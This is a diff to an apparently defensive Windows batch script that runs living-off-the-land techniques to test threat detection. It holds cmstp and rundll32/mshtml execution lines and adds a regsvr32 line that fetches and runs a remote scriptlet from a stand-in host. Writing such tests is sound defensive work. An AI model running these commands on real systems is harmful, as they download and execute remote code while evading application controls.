@@ -501,6 +501,7 @@ cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBi
 ECHO ============================
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
 ECHO ============================
+regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 ECHO ============================
 ECHO ***************************************************
 ECHO Test already Finishied  ! Happy hunting threats :)
